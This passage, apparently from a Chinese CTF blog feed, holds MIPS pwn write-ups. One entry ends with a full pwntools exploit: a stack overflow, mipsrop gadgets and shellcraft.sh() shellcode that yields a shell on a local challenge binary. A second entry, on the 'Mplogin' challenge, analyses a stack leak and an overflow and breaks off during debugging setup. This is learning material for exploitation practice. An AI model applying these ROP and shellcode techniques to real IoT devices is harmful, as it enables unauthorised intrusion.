v6;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = &amp;v5[-v16];</span><br><span class="line">      <span class="keyword">if</span> ( !v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;format error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      v14[<span class="number">1</span>] = <span class="number">1633771776</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先存在堆溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">v15=read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br></pre></td></tr></table></figure><p>此后会将堆上的内容拷贝到栈上，可能发生栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> v4[<span class="number">2</span>]; <span class="comment">// [sp+10h] [+10h] BYREF</span></span><br><span class="line"><span class="keyword">int</span> v16; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">v12 = v4;</span><br><span class="line">v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">v14 = v13;</span><br><span class="line">v16 = <span class="built_in">strchr</span>(v6, <span class="number">58</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br></pre></td></tr></table></figure><p>开始先用<code>qemu-mips -g 1234 ./pwn</code>命令打开远程终端，然后用gdb调试，在终端分别输入1和由<code>“1：”+“a”*x</code>组成的字符串，经过多次测试得当x大于等于90时开始对<code>$ra</code>产生溢出覆盖，所以溢出边界为0x90个字节，具体调试信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/mpwn$ gdb-multiarch -q ./pwn</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./pwn...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line"></span><br><span class="line">省略开始处断点信息</span><br><span class="line"></span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line"> </span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">0x610a0af4 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> V0   0x0</span><br><span class="line">*V1   0x61616162 (<span class="string">&#x27;aaab&#x27;</span>)</span><br><span class="line">*A0   0x76ffef9e ◂— 0xaf40000</span><br><span class="line">*A1   0x4a2fa4 ◂— 0</span><br><span class="line">*A2   0x2</span><br><span class="line">*A3   0x76ffef9e ◂— 0xaf40000</span><br><span class="line">*T0   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T1   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T2   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T3   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T4   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T5   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T6   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T7   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T8   0x12</span><br><span class="line">*T9   0x76ffee7e ◂— 0xf0340049</span><br><span class="line">*S0   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S1   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S2   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S3   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S4   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S5   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S6   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S7   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S8   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*FP   0x76ffefa0 ◂— 0x0</span><br><span class="line">*SP   0x76ffefa0 ◂— 0x0</span><br><span class="line">*PC   0x610a0af4</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x610a0af4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ fp sp  0x76ffefa0 ◂— 0x0</span><br><span class="line">01:0004│        0x76ffefa4 —▸ 0x4012e0 (__libc_csu_init) ◂— addiu  <span class="variable">$sp</span>, <span class="variable">$sp</span>, -0x38</span><br><span class="line">02:0008│        0x76ffefa8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">04:0010│        0x76ffefb0 —▸ 0x4a8300 ◂— 0</span><br><span class="line">05:0014│        0x76ffefb4 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:001c│        0x76ffefbc —▸ 0x400d64 (__libc_start_main+564) ◂— lui    <span class="variable">$t9</span>, 0x40</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 610a0af4</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gdb-peda$ info reg</span><br><span class="line">          zero       at       v0       v1       a0       a1       a2       a3</span><br><span class="line"> R0   00000000 00000001 00000000 61616162 76ffef9e 004a2fa4 00000002 76ffef9e </span><br><span class="line">            t0       t1       t2       t3       t4       t5       t6       t7</span><br><span class="line"> R8   61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 </span><br><span class="line">            s0       s1       s2       s3       s4       s5       s6       s7</span><br><span class="line"> R16  61616161 61616161 61616161 61616161 61616161 61616161 61616161 61616161 </span><br><span class="line">            t8       t9       k0       k1       gp       sp       s8       ra</span><br><span class="line"> R24  00000012 76ffee7e 00000000 00000000 61616161 76ffefa0 61616161 610a0af4 </span><br><span class="line">            sr       lo       hi      bad    cause       pc</span><br><span class="line">      20000010 999999a3 00000025 610a0af4 00000000 610a0af4 </span><br><span class="line">           fsr      fir</span><br><span class="line">      00000000 00739300</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此次调试x为91，可以看到<code>$ra</code>头部第一个字节已被覆盖。</p><p>由于没有地方泄露了栈地址，所以需要用ROP来构造指令，在IDA中激活mipsrop插件，应有提示如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIPS ROP Finder activated, found <span class="number">842</span> controllable jumps between <span class="number">0x00400000</span> <span class="keyword">and</span> <span class="number">0x004740A0</span></span><br></pre></td></tr></table></figure><p>首先用<code>mipsrop.stackfinder()</code>寻找gadget：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x004273C4</span>  |  addiu $a2,$sp,<span class="number">0x70</span>+var_C                            |  jalr  $s0                             |</span><br><span class="line">|  <span class="number">0x0042BCD0</span>  |  addiu $a2,$sp,<span class="number">0x88</span>+var_C                            |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0042FA00</span>  |  addiu $v1,$sp,<span class="number">0x138</span>+var_104                         |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x004491F8</span>  |  addiu $a2,$sp,<span class="number">0x44</span>+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x0044931C</span>  |  addiu $v0,$sp,<span class="number">0x30</span>+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x00449444</span>  |  addiu $a2,$sp,<span class="number">0x44</span>+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x0044AD58</span>  |  addiu $a1,$sp,<span class="number">0x60</span>+var_28                           |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0044AEFC</span>  |  addiu $a1,$sp,<span class="number">0x64</span>+var_28                           |  jalr  $s5                             |</span><br><span class="line">|  <span class="number">0x0044B154</span>  |  addiu $a1,$sp,<span class="number">0x6C</span>+var_38                           |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044B1EC</span>  |  addiu $v0,$sp,<span class="number">0x6C</span>+var_40                           |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044B3EC</span>  |  addiu $v0,$sp,<span class="number">0x170</span>+var_130                         |  jalr  $s0                             |</span><br><span class="line">|  <span class="number">0x00454E94</span>  |  addiu $s7,$sp,<span class="number">0xB8</span>+var_98                           |  jalr  $s3                             |</span><br><span class="line">|  <span class="number">0x00465BEC</span>  |  addiu $a1,$sp,<span class="number">0xC4</span>+var_98                           |  jalr  $s0                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">13</span> matching gadgets</span><br></pre></td></tr></table></figure><p>以第一个gadget为例<code>addiu $a2,$sp,0x70+var_C  |  jalr  $s0</code>，其中<code>var_C</code>为<code>-0xc</code>，所以这个gadget会将$sp寄存器的值加上0x70-0xc=0x64放到$a2寄存器中，然后跳转到$s0寄存器中的地址执行。所以若可以控制$s0寄存器的值指向一个跳转到$a2的gadget，然后在&amp;sp+0x64的栈地址处布置shellcode即可利用。</p><p>首先要找到跳转到$a2的gadget。由于在mips汇编中，间接跳转通常由$t9寄存器实现，所以尝试搜索命令和结果如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.find(<span class="string">&quot;move $t9,$a2&quot;</span>)</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x00421684</span>  |  move $t9,$a2                                        |  jr    $a2                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">1</span> matching gadgets</span><br></pre></td></tr></table></figure><p>成功找到该gadget，然后尝试控制$s0寄存器。</p><p>在MIPS复杂函数的序言和尾声中，会保存和恢复s组寄存器，所以查看一下pwn函数的尾声的汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A2C                 move    $sp, $fp</span><br><span class="line">.text:00400A30                 lw      $ra, 0x58+var_s24($sp)</span><br><span class="line">.text:00400A34                 lw      $fp, 0x58+var_s20($sp)</span><br><span class="line">.text:00400A38                 lw      $s7, 0x58+var_s1C($sp)</span><br><span class="line">.text:00400A3C                 lw      $s6, 0x58+var_s18($sp)</span><br><span class="line">.text:00400A40                 lw      $s5, 0x58+var_s14($sp)</span><br><span class="line">.text:00400A44                 lw      $s4, 0x58+var_s10($sp)</span><br><span class="line">.text:00400A48                 lw      $s3, 0x58+var_sC($sp)</span><br><span class="line">.text:00400A4C                 lw      $s2, 0x58+var_s8($sp)</span><br><span class="line">.text:00400A50                 lw      $s1, 0x58+var_s4($sp)</span><br><span class="line">.text:00400A54                 lw      $s0, 0x58+var_s0($sp)</span><br><span class="line">.text:00400A58                 addiu   $sp, 0x80</span><br><span class="line">.text:00400A5C                 jr      $ra</span><br><span class="line">.text:00400A60                 nop</span><br><span class="line">.text:00400A60  # End of function pwn</span><br></pre></td></tr></table></figure><p>由于我们之前溢出时在<code>0x90</code>处控制了<code>$ra</code>,则可以在<code>0x90-0x24=0x6c</code>处控制<code>$s0</code></p><p>在函数的尾声处会将栈空间回收，即为上面代码块<code>.text:00400A58</code>处 ,可以构造输入使在<code>$ra</code>处用跳转到<code>$s0</code>的gadget覆盖，在<code>$s0</code>用跳转到<code>$a2</code>的gadget覆盖，并在溢出点后0x64位处拼接shellcode即可，完整的脚本如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">g_to_a2=<span class="number">0x00421684</span></span><br><span class="line">g_to_s0=<span class="number">0x004273C4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1:&#x27;</span> + <span class="number">0x6c</span>*<span class="string">&#x27;a&#x27;</span> + p32(g_to_a2) </span><br><span class="line">payload+= <span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span> + p32(g_to_s0)</span><br><span class="line">payload+= <span class="number">0x64</span>*<span class="string">&#x27;a&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Job.&#x27;&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-MIPS-Mplogin</title>
      <link href="2020/11/21/Pwn-MIPS-Mplogin/"/>
      <url>2020/11/21/Pwn-MIPS-Mplogin/</url>
      
        <content type="html"><![CDATA[<p><strong>从MIPS入手IOT逆向，先学习一两道题热身，思路主要来源是学长的博客，记录下写题的过程，系统是Ubuntu16.04</strong></p><a id="more"></a><p>首先检查文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ file Mplogin</span><br><span class="line">Mplogin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">ssr@ubuntu:~/iot/Mplogin$ checksec Mplogin</span><br><span class="line">[!] Could not populate PLT: Invalid memory write (UC_ERR_WRITE_UNMAPPED)</span><br><span class="line">[*] <span class="string">&#x27;/home/ssr/iot/Mplogin/Mplogin&#x27;</span></span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出是小端的MIPS32架构，没开任何保护</p><p>这里需要使用模拟器QEMU的User模式运行，安装命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu qemu-user qemu-user-static</span><br></pre></td></tr></table></figure><p>因为是小端mips，所以使用qemu-mipsel模拟，命令和反馈为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ qemu-mipsel -L ./ Mplogin</span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : </span><br></pre></td></tr></table></figure><p>显然是要先输入一段字符串。</p><p>用IDA打开分析,首先f5看一下主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $a2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, envp);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[33m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;</span>);</span><br><span class="line">  v5 = sub_400840();</span><br><span class="line">  sub_400978(v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[32m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Now you getshell~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到sub_400840和sub_400978是主要用的函数，分别打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400840</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，该函数将输入前5个字节与”admin”比较，相同则会打印correct，并继续程序，返回输入的长度。read函数不会检查内容的长度，可以输入一个长字符串填满栈上的缓冲区，在printf时对栈上的数据泄露。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400978</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a1 + <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pre_Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">36</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v2, <span class="string">&quot;access&quot;</span>, <span class="number">6</span>) || <span class="built_in">strncmp</span>(v4, <span class="string">&quot;0123456789&quot;</span>, <span class="number">10</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Correct password : **********&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，该函数要输入两次，1次输入36字节v2，一次输入用户名长度加4字节的v4，分别进行比较，即可结束函数，由于第二次输入时的长度由v3控制，所以可以首先在首次输入时输入超过20字节溢出覆盖v3变量，v3变量即覆盖为超出的字节值，保证v3足够大即可，再次输入时由v3控制长度导致栈溢出。</p><p>构造三次输入进行试验</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin111111111111111111</span><br><span class="line">access11111111111111</span><br><span class="line">012345678911111111111111111111111111</span><br></pre></td></tr></table></figure><p>结果如下所示，显然有数据泄露和栈溢出的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ qemu-mipsel -L ./ Mplogin</span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : admin111111111111111111</span><br><span class="line">Correct name : admin111111111111111111</span><br><span class="line">���v�</span><br><span class="line">     @Pre_Password : access11111111111111</span><br><span class="line">Password : 012345678911111111111111111111111111  </span><br><span class="line">Correct password : **********</span><br><span class="line">Now you getshell~</span><br><span class="line">ssr@ubuntu:~/iot/Mplogin$ 11111111111111111111111111</span><br><span class="line">11111111111111111111111111：未找到命令</span><br></pre></td></tr></table></figure><p>第二个命令处非主动输入，可以由此着手找到执行shell的漏洞，下面开始分析原因</p><p>首先分析sub_400840的栈帧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00400840 sub_400840:                              # CODE XREF: main+9C↓p</span><br><span class="line">.text:00400840</span><br><span class="line">.text:00400840 var_20          &#x3D; -0x20</span><br><span class="line">.text:00400840 var_18          &#x3D; -0x18</span><br><span class="line">.text:00400840 var_s0          &#x3D;  0</span><br><span class="line">.text:00400840 var_s4          &#x3D;  4</span><br><span class="line">.text:00400840</span><br><span class="line">.text:00400840                 addiu   $sp, -0x38</span><br><span class="line">.text:00400844                 sw      $ra, 0x30+var_s4($sp)</span><br><span class="line">.text:00400848                 sw      $fp, 0x30+var_s0($sp)</span><br><span class="line">.text:0040084C                 move    $fp, $sp</span><br><span class="line">.text:00400850                 li      $gp, 0x418E50</span><br><span class="line">.text:00400858                 sw      $gp, 0x30+var_20($sp)</span><br><span class="line">.text:0040085C                 li      $a2, 0x18</span><br><span class="line">.text:00400860                 move    $a1, $zero</span><br><span class="line">.text:00400864                 addiu   $v0, $fp, 0x30+var_18</span><br><span class="line">.text:00400868                 move    $a0, $v0</span><br><span class="line">.text:0040086C                 la      $v0, memset</span><br><span class="line">.text:00400870                 move    $t9, $v0</span><br><span class="line">.text:00400874                 jalr    $t9 ; memset</span><br></pre></td></tr></table></figure><p>在<code>v1[24]</code>后就是<code>$fp</code>，而在函数体之中<code>$fp</code>和<code>$sp</code>相同，均指向栈顶，所以这里泄露出了<code>main</code>函数进入<code>sub_400840</code>的栈顶地址。</p><p>首先使用<code>qemu-user</code>的<code>-g</code>模式在1234端口启动调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 1234 -L ./ Mplogin  